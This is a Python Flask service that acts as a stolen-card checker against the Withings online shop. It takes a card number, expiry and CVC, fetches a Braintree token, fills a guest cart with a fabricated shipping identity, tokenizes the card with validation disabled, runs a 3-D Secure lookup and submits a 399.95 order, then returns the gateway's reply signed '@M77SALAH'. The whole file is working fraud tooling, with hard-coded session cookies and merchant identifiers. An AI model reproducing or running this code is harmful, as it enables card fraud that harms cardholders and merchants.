from flask import Flask, request, jsonify
import requests , re , base64
from user_agent import generate_user_agent
from bs4 import BeautifulSoup
brok = Flask(__name__)

@brok.route("/")
def convert_code():
    error_reporting = 'error_reporting(0);'
    content_type = 'header("content-type: application/json");'
    P = request.args.get('list')
    n = P.split('|')[0]
    bin3=n[:6]
    mm=P.split('|')[1]
    if int(mm) == 12 or int(mm) == 11 or int(mm) == 10:
    	mm = mm
    elif '0' not in mm:
    	mm = f'0{mm}'
    else:
    	mm = mm
    yy=P.split('|')[2]
    cvc=P.split('|')[3].replace('\n', '')
    P=P.replace('\n', '')	
    if "20" not in yy:
        yy = f'20{yy}'
    else:
    	yy = yy
    
    cookies = {
    'cookieconsent_statistics': 'true',
    'cookieconsent_social': 'true',
    'cookieconsent_advertising': 'true',
    '_gcl_au': '1.1.335128438.1707170287',
    'withings_cookieconsent_dismissed': '1',
    '_scid': 'da053b0a-b370-4864-a1ca-aac87042ec73',
    '_pin_unauth': 'dWlkPVltRTJZVEExWlRVdE1tVTBPQzAwTlRRMExXSTNaREF0TTJZeU9USmhNekV5WmprNQ',
    'rl_page_init_referrer': 'RudderEncrypt%3AU2FsdGVkX18VSGIkOMO8rmZmGx6ix44hqozS2udHrzc%3D',
    'rl_page_init_referring_domain': 'RudderEncrypt%3AU2FsdGVkX197crCAqc0VB5dyIgxy8xCyvZS64KGudDI%3D',
    '_fbp': 'fb.1.1707170287649.962797582',
    '_ga': 'GA1.2.155774671.1707170309',
    '_tt_enable_cookie': '1',
    '_ttp': 'rc1jP6_IkYAbm1vq3M0pO0wwhK9',
    'PHPSESSID': 'proi8eda2rtitjolc7ldcn8qss',
    '_clck': 'zl2xy3%7C2%7Cfl8%7C0%7C1496',
    '_sctr': '1%7C1713992400000',
    '_gid': 'GA1.2.5678976.1714046934',
    'signin_redirect_url': 'https://account.withings.com/new_workflow/login',
    'cto_bundle': 'Qhh_3V9lZXdweTFiSW1LOEJVOUpFJTJGWWV3UVFQOUZCNmU1QmFXSUc4YVhjS1padFhSVDlpT29abWJPaGtiZ09pU3RsRiUyRkRndWxtM2tFaHdxS3Bwa3VQZEVzU09wYkQ5RGZlRXFUdFplVWlKUDhrSXQwTnN1Nk1JOUh1Um1XTiUyQjRHNGlWcG1EWHglMkIxcDVaa0p2bHdaN21kWmZrdyUzRCUzRA',
    'ABTastySession': 'mrasn=&lp=https%253A%252F%252Fwww.withings.com%252Feu%252Fen%252Faccount%252Flogin%252Fredirect%253Fr%253Dhttps%253A%252F%252Faccounts.google.com%252Fo%252Foauth2%252Fv2%252Fauth%253Fresponse_type%253Dcode%2526access_type%253Doffline%2526client_id%253D655894465677-2lq45fkgtl2g0n95nm4g34qunf362ec5.apps.googleusercontent.com%2526redirect_uri%253Dhttps%253A%252F%252Faccount.withings.com%252Fgoogle_sign_in%252Flogin%2526state%253D6875e77046%2526scope%253Demail%2520openid%2520profile%2526approval_prompt%253Dauto',
    'rl_user_id': 'RudderEncrypt%3AU2FsdGVkX1%2FItEmI34qL9OC8KxWzy%2BGiApcIwxhmAi8%3D',
    'rl_trait': 'RudderEncrypt%3AU2FsdGVkX1922btvt1ZnVBkAdDFqtQVuXAoJ2kmmFmw%3D',
    'rl_group_id': 'RudderEncrypt%3AU2FsdGVkX19KpHO597C36JVS7cesq%2FIPPzCeRn1yBO8%3D',
    'rl_group_trait': 'RudderEncrypt%3AU2FsdGVkX1%2FR%2B1UG6N4ZhQDrzC45W1jxBZ6tHzPJ9A8%3D',
    'rl_anonymous_id': 'RudderEncrypt%3AU2FsdGVkX1%2BvY0GJ%2BmUIR7m5bVDAcCUVg4IE3JOWqAXPqV6ElAtLEd3Dk1Rtw7yQBQ74PhjqWoA%2BBnpHgTeINw%3D%3D',
    'ABTasty': 'uid=pt98rvectm2sm8cq&fst=1714046953003&pst=-1&cst=1714046953003&ns=1&pvt=18&pvis=18&th=1178033.1461124.3.3.1.1.1714047244201.1714049005711.1.1_1207948.1496961.1.1.1.1.1714049005968.1714049005968.0.1_1208344.1497450.3.3.1.1.1714047240482.1714048989499.0.1_1209047.1498354.18.18.1.1.1714046953204.1714049164166.0.1',
    '_uetsid': 'e248d0d002fb11efa6238b40b6302de3',
    '_uetvid': 'a50cff00c47111ee8a34a993dad2da06',
    '_scid_r': 'da053b0a-b370-4864-a1ca-aac87042ec73',
    'rl_session': 'RudderEncrypt%3AU2FsdGVkX18zL7zPJp6p9kXO1%2ByGRmMxFVmVaO0AAI5LiTKd17tR3DwOtMcZ%2FHVmlV%2B59qXprhRt3ejrFllR%2FKNDsDAJXPt7sO0JYn8OoPnGr6m1okrAMpb9xI3r0ckecNNXiqkeBoGL4ZcJGiatJg%3D%3D',
    '_clsk': '1igeiwq%7C1714049164858%7C17%7C1%7Cl.clarity.ms%2Fcollect',
    'private_content_version': 'c1826d943a76b0d05141debda8ebee1b',
    }

    headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    'Origin': 'https://www.withings.com',
    'Referer': 'https://www.withings.com/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'Store': 'store_eu',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    }

    json_data = {
    'query': 'mutation {\n            createBraintreeClientToken \n            googlepayConfig {\n                merchantId\n                environment\n            }\n        }',
    }

    response = requests.post('https://shop2.withings.com/graphql', cookies=cookies, headers=headers, json=json_data)
    pr_cont_ve=(response.cookies['private_content_version'])
    token1 = (response.json()['data']['createBraintreeClientToken'])

    dec = base64.b64decode(token1).decode('utf-8')
    authtoken = re.findall('"authorizationFingerprint":"(.*?)"',dec)[0]

    cookies = {
    'cookieconsent_statistics': 'true',
    'cookieconsent_social': 'true',
    'cookieconsent_advertising': 'true',
    '_gcl_au': '1.1.335128438.1707170287',
    'withings_cookieconsent_dismissed': '1',
    '_scid': 'da053b0a-b370-4864-a1ca-aac87042ec73',
    '_pin_unauth': 'dWlkPVltRTJZVEExWlRVdE1tVTBPQzAwTlRRMExXSTNaREF0TTJZeU9USmhNekV5WmprNQ',
    'rl_page_init_referrer': 'RudderEncrypt%3AU2FsdGVkX18VSGIkOMO8rmZmGx6ix44hqozS2udHrzc%3D',
    'rl_page_init_referring_domain': 'RudderEncrypt%3AU2FsdGVkX197crCAqc0VB5dyIgxy8xCyvZS64KGudDI%3D',
    '_fbp': 'fb.1.1707170287649.962797582',
    '_ga': 'GA1.2.155774671.1707170309',
    '_tt_enable_cookie': '1',
    '_ttp': 'rc1jP6_IkYAbm1vq3M0pO0wwhK9',
    'PHPSESSID': 'proi8eda2rtitjolc7ldcn8qss',
    '_clck': 'zl2xy3%7C2%7Cfl8%7C0%7C1496',
    '_sctr': '1%7C1713992400000',
    '_gid': 'GA1.2.5678976.1714046934',
    'signin_redirect_url': 'https://account.withings.com/new_workflow/login',
    'cto_bundle': 'kppzwV9lZXdweTFiSW1LOEJVOUpFJTJGWWV3UVZWR0F3aVFwOXVobnRHVVpnWm9leUYyU3glMkY2bDVrdmxPcCUyQnU3dlluRngwazJYVFpFRFhsRW5yN3Nya01WY25KUDVJSU81UyUyQnRuNUo5dmlRN2xpRG16VjdjR2llUjhyRG1WMmRyNjFMQW9hJTJCOUtSd2ppSGQwc0loUkkwQzVIJTJCMHclM0QlM0Q',
    'ABTastySession': 'mrasn=&lp=https%253A%252F%252Fwww.withings.com%252Feu%252Fen%252Faccount%252Flogin%252Fredirect%253Fr%253Dhttps%253A%252F%252Faccounts.google.com%252Fo%252Foauth2%252Fv2%252Fauth%253Fresponse_type%253Dcode%2526access_type%253Doffline%2526client_id%253D655894465677-2lq45fkgtl2g0n95nm4g34qunf362ec5.apps.googleusercontent.com%2526redirect_uri%253Dhttps%253A%252F%252Faccount.withings.com%252Fgoogle_sign_in%252Flogin%2526state%253D6875e77046%2526scope%253Demail%2520openid%2520profile%2526approval_prompt%253Dauto',
    'ABTasty': 'uid=pt98rvectm2sm8cq&fst=1714046953003&pst=-1&cst=1714046953003&ns=1&pvt=12&pvis=12&th=1178033.1461124.1.1.1.1.1714047244201.1714047244201.1.1_1208344.1497450.2.2.1.1.1714047240482.1714047244217.0.1_1209047.1498354.12.12.1.1.1714046953204.1714047268447.0.1',
    'rl_user_id': 'RudderEncrypt%3AU2FsdGVkX1%2BfGrfDzlb5UTDr4mWXXtA0jEP%2FFGqVfIc%3D',
    'rl_trait': 'RudderEncrypt%3AU2FsdGVkX19ZtTMjBmnlKxBhqaBfAnTMKqespPloIPc%3D',
    'rl_group_id': 'RudderEncrypt%3AU2FsdGVkX190gxGVlN9TIqMp4DGuEeA3rdNbzNAz%2FP4%3D',
    'rl_group_trait': 'RudderEncrypt%3AU2FsdGVkX19RhZJg1Lt6GsIRQNbtlo2oElLbg6iynoo%3D',
    'rl_anonymous_id': 'RudderEncrypt%3AU2FsdGVkX1%2BB7r4Pyeo5R9wUVk27Jngkna5XkhMX9jhrbYY9GI%2B%2BGYQ54H3uy%2FPsUSh5wQOX%2Bj7GUebIR939uw%3D%3D',
    '_uetsid': 'e248d0d002fb11efa6238b40b6302de3',
    '_uetvid': 'a50cff00c47111ee8a34a993dad2da06',
    '_scid_r': 'da053b0a-b370-4864-a1ca-aac87042ec73',
    '_clsk': '1igeiwq%7C1714047269648%7C11%7C1%7Cl.clarity.ms%2Fcollect',
    'rl_session': 'RudderEncrypt%3AU2FsdGVkX1%2FTtKn9nux%2FYn42uyNCRcOxIFUtgEv0VcLk1AvHdvpYl5EgiUnxXXgTEg9clpv7B%2Ft271FinmI%2BHcphNd5wlQlaZM6YAomDQPHazM58E81%2B%2FplbV%2FUK0QaXUHCbQnRAorMfZtTP%2FaiKSQ%3D%3D',
    'private_content_version': pr_cont_ve,
    }

    headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    'Origin': 'https://www.withings.com',
    'Referer': 'https://www.withings.com/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    }

    json_data = {
    'addressInformation': {
        'shipping_address': {
            'country_id': 'DE',
            'telephone': '5035185000',
            'street': [
                'Rögener Grund 19',
            ],
            'postcode': '96450',
            'city': 'Coburg',
            'firstname': 'Jamel',
            'lastname': 'Bergstrom',
            'email': 'ngrokmtx@gmail.com',
            'same_as_billing': 1,
            'region_id': None,
            'company': 'monty',
        },
        'shipping_carrier_code': 'owsh10',
        'shipping_method_code': 'eu_std_49',
        'billing_address': {
            'country_id': 'DE',
            'region_id': None,
            'region_code': '',
            'street': [
                'Rögener Grund 19',
            ],
            'telephone': '5035185000',
            'postcode': '96450',
            'city': 'Coburg',
            'firstname': 'Jamel',
            'lastname': 'Bergstrom',
            'email': 'ngrokmtx@gmail.com',
        },
    },
    }

    response = requests.post(
    'https://shop2.withings.com/rest/store_eu/V1/guest-carts/Vx1GbuuU49YH9EOMF5hIktOc51mSrGsq/shipping-information',
    cookies=cookies,
    headers=headers,
    json=json_data,
    )
    phpsessid=(response.cookies['PHPSESSID'])
    headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
    'authorization': f'Bearer {authtoken}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    }

    json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': 'c97f5fd9-c278-4601-9525-061aa944824c',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
    }

    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
    token = response.json()['data']['tokenizeCreditCard']['token']


    headers = {
    'authority': 'api.braintreegateway.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
    'content-type': 'application/json',
    'origin': 'https://www.withings.com',
    'referer': 'https://www.withings.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    }

    json_data = {
    'amount': 399.95,
    'additionalInfo': {
        'shippingGivenName': 'Jamel',
        'shippingSurname': 'Bergstrom',
        'shippingPhone': '5035185000',
        'billingLine1': 'Rögener Grund 19',
        'billingLine2': '',
        'billingCity': 'Coburg',
        'billingPostalCode': '96450',
        'billingCountryCode': 'DE',
        'billingPhoneNumber': '5035185000',
        'billingGivenName': 'Jamel',
        'billingSurname': 'Bergstrom',
        'shippingLine1': 'Rögener Grund 19',
        'shippingLine2': '',
        'shippingCity': 'Coburg',
        'shippingPostalCode': '96450',
        'shippingCountryCode': 'DE',
        'email': 'ngrokmtx@gmail.com',
    },
    'bin': bin3,
    'dfReferenceId': '1_2d372999-1e1d-4ee7-b19c-8cf680f180f7',
    'clientMetadata': {
        'requestedThreeDSecureVersion': '2',
        'sdkVersion': 'web/3.85.3',
        'cardinalDeviceDataCollectionTimeElapsed': 15,
        'issuerDeviceDataCollectionTimeElapsed': 2,
        'issuerDeviceDataCollectionResult': True,
    },
    'authorizationFingerprint': authtoken,
    'braintreeLibraryVersion': 'braintree/web/3.85.3',
    '_meta': {
        'merchantAppId': 'www.withings.com',
        'platform': 'web',
        'sdkVersion': '3.85.3',
        'source': 'client',
        'integration': 'custom',
        'integrationType': 'custom',
        'sessionId': 'c97f5fd9-c278-4601-9525-061aa944824c',
    },
    }

    response = requests.post(
    f'https://api.braintreegateway.com/merchants/vw7jhmt2bnyp23rb/client_api/v1/payment_methods/{token}/three_d_secure/lookup',
    headers=headers,
    json=json_data,
    )
    nonce = (response.json()['paymentMethod']['nonce'])

    d3=(response.json()['paymentMethod']["threeDSecureInfo"]['status'])


    cookies = {
    'cookieconsent_statistics': 'true',
    'cookieconsent_social': 'true',
    'cookieconsent_advertising': 'true',
    '_gcl_au': '1.1.335128438.1707170287',
    'withings_cookieconsent_dismissed': '1',
    '_scid': 'da053b0a-b370-4864-a1ca-aac87042ec73',
    '_pin_unauth': 'dWlkPVltRTJZVEExWlRVdE1tVTBPQzAwTlRRMExXSTNaREF0TTJZeU9USmhNekV5WmprNQ',
    'rl_page_init_referrer': 'RudderEncrypt%3AU2FsdGVkX18VSGIkOMO8rmZmGx6ix44hqozS2udHrzc%3D',
    'rl_page_init_referring_domain': 'RudderEncrypt%3AU2FsdGVkX197crCAqc0VB5dyIgxy8xCyvZS64KGudDI%3D',
    '_fbp': 'fb.1.1707170287649.962797582',
    '_ga': 'GA1.2.155774671.1707170309',
    '_tt_enable_cookie': '1',
    '_ttp': 'rc1jP6_IkYAbm1vq3M0pO0wwhK9',
    'PHPSESSID': phpsessid,
    '_clck': 'zl2xy3%7C2%7Cfl8%7C0%7C1496',
    '_sctr': '1%7C1713992400000',
    '_gid': 'GA1.2.5678976.1714046934',
    'signin_redirect_url': 'https://account.withings.com/new_workflow/login',
    'cto_bundle': 'kppzwV9lZXdweTFiSW1LOEJVOUpFJTJGWWV3UVZWR0F3aVFwOXVobnRHVVpnWm9leUYyU3glMkY2bDVrdmxPcCUyQnU3dlluRngwazJYVFpFRFhsRW5yN3Nya01WY25KUDVJSU81UyUyQnRuNUo5dmlRN2xpRG16VjdjR2llUjhyRG1WMmRyNjFMQW9hJTJCOUtSd2ppSGQwc0loUkkwQzVIJTJCMHclM0QlM0Q',
    'ABTastySession': 'mrasn=&lp=https%253A%252F%252Fwww.withings.com%252Feu%252Fen%252Faccount%252Flogin%252Fredirect%253Fr%253Dhttps%253A%252F%252Faccounts.google.com%252Fo%252Foauth2%252Fv2%252Fauth%253Fresponse_type%253Dcode%2526access_type%253Doffline%2526client_id%253D655894465677-2lq45fkgtl2g0n95nm4g34qunf362ec5.apps.googleusercontent.com%2526redirect_uri%253Dhttps%253A%252F%252Faccount.withings.com%252Fgoogle_sign_in%252Flogin%2526state%253D6875e77046%2526scope%253Demail%2520openid%2520profile%2526approval_prompt%253Dauto',
    'ABTasty': 'uid=pt98rvectm2sm8cq&fst=1714046953003&pst=-1&cst=1714046953003&ns=1&pvt=12&pvis=12&th=1178033.1461124.1.1.1.1.1714047244201.1714047244201.1.1_1208344.1497450.2.2.1.1.1714047240482.1714047244217.0.1_1209047.1498354.12.12.1.1.1714046953204.1714047268447.0.1',
    'rl_user_id': 'RudderEncrypt%3AU2FsdGVkX1%2BfGrfDzlb5UTDr4mWXXtA0jEP%2FFGqVfIc%3D',
    'rl_trait': 'RudderEncrypt%3AU2FsdGVkX19ZtTMjBmnlKxBhqaBfAnTMKqespPloIPc%3D',
    'rl_group_id': 'RudderEncrypt%3AU2FsdGVkX190gxGVlN9TIqMp4DGuEeA3rdNbzNAz%2FP4%3D',
    'rl_group_trait': 'RudderEncrypt%3AU2FsdGVkX19RhZJg1Lt6GsIRQNbtlo2oElLbg6iynoo%3D',
    'rl_anonymous_id': 'RudderEncrypt%3AU2FsdGVkX1%2BB7r4Pyeo5R9wUVk27Jngkna5XkhMX9jhrbYY9GI%2B%2BGYQ54H3uy%2FPsUSh5wQOX%2Bj7GUebIR939uw%3D%3D',
    '_uetsid': 'e248d0d002fb11efa6238b40b6302de3',
    '_uetvid': 'a50cff00c47111ee8a34a993dad2da06',
    '_scid_r': 'da053b0a-b370-4864-a1ca-aac87042ec73',
    '_clsk': '1igeiwq%7C1714047269648%7C11%7C1%7Cl.clarity.ms%2Fcollect',
    'rl_session': 'RudderEncrypt%3AU2FsdGVkX1%2FTtKn9nux%2FYn42uyNCRcOxIFUtgEv0VcLk1AvHdvpYl5EgiUnxXXgTEg9clpv7B%2Ft271FinmI%2BHcphNd5wlQlaZM6YAomDQPHazM58E81%2B%2FplbV%2FUK0QaXUHCbQnRAorMfZtTP%2FaiKSQ%3D%3D',
    'private_content_version': pr_cont_ve,
    }

    headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    'Origin': 'https://www.withings.com',
    'Referer': 'https://www.withings.com/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    }

    json_data = {
    'paymentMethod': {
        'method': 'braintree',
        'additional_data': {
            'payment_method_nonce': nonce,
        },
    },
    }

    response = requests.put(
    'https://shop2.withings.com/rest/store_eu/V1/guest-carts/Vx1GbuuU49YH9EOMF5hIktOc51mSrGsq/order',
    cookies=cookies,
    headers=headers,
    json=json_data,
    )
    msg = (response.json()["parameters"][0])
    response = {'result': msg,'Made':'@M77SALAH'}
    return jsonify(response)

if __name__ == "__main__":
    brok.run()
    brok.run(host='0.0.0.0', port=8080)
